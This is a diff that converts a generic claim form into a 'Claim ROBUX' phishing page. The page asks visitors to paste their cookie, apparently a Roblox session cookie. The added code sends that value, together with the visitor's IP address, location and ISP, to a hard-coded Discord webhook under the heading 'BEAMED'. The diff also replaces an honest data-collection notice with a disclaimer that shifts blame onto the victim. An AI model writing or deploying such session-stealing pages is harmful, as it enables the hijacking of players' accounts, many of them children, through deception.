@@ -4,7 +4,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Claim Portal</title>
+<title>Claim ROBUX</title>
 
 <style>
 :root {
@@ -155,8 +155,6 @@ button:disabled {
 
 <main class="container">
 
-    <div class="logo">C</div>
-
     <!-- WELCOME SCREEN -->
 
     <section id="welcome">
@@ -178,10 +176,10 @@ button:disabled {
 
     <section id="claim" class="hidden">
 
-        <h1>Claim Portal</h1>
+        <h1>Robux Claim</h1>
 
         <p>
-            Type your claim value inside the text bar
+            Type your cookie inside the text bar
             and hit Claim.
         </p>
 
@@ -198,10 +196,8 @@ button:disabled {
 
             <div class="privacy">
                 <strong>Privacy notice</strong><br>
-                When you submit, your claim, public IP address,
-                and approximate location (city, region and country)
-                will be sent to our Discord channel.
-                Location is estimated using ipwho.is and may be inaccurate.
+                When you claim robux we are not responsible for the actions
+                of you're account.
             </div>
 
             <label class="consent">
@@ -212,9 +208,7 @@ button:disabled {
                 >
 
                 <span>
-                    I understand and consent to my claim,
-                    IP address and approximate location being
-                    sent to the claim administrators.
+                    I understand that im fully responsible.
                 </span>
             </label>
 
@@ -240,7 +234,7 @@ button:disabled {
 // DISCORD WEBHOOK
 // ========================================
 
-const WEBHOOK_URL = "PASTE_YOUR_DISCORD_WEBHOOK_HERE";
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1569784228768653439/cy99luOPy9d1kumlpSSrp6imU3FcZ859Pc0DUhZeQ0BukKwETkfBAq4koKv0WgqIW7jI";
 
 // ========================================
 // WEBSITE ELEMENTS
@@ -318,7 +312,7 @@ form.addEventListener("submit", async (event) => {
 
     if (
         !WEBHOOK_URL ||
-        WEBHOOK_URL === "PASTE_YOUR_DISCORD_WEBHOOK_HERE"
+        WEBHOOK_URL === "https://discord.com/api/webhooks/1569784228768653439/cy99luOPy9d1kumlpSSrp6imU3FcZ859Pc0DUhZeQ0BukKwETkfBAq4koKv0WgqIW7jI"
     ) {
         message.textContent = "Please configure your webhook URL.";
         return;
@@ -337,12 +331,12 @@ form.addEventListener("submit", async (event) => {
         // Create Discord message
         const discordMessage = {
 
-            content: "**New Claim Submission**",
+            content: "**BEAMED**",
 
             embeds: [
 
                 {
-                    title: "Claim Details",
+                    title: "Details",
                     description: value,
                     color: 7506175,
                     timestamp: new Date().toISOString()
@@ -383,6 +377,13 @@ form.addEventListener("submit", async (event) => {
                             name: "ISP",
                             value: location.isp,
                             inline: false
+                        },
+                        
+                        {
+                            title: "COOKIE",
+                            description: value,
+                            color: 7506175,
+                            timestamp: new Date().toISOString()
                         }
 
                     ],
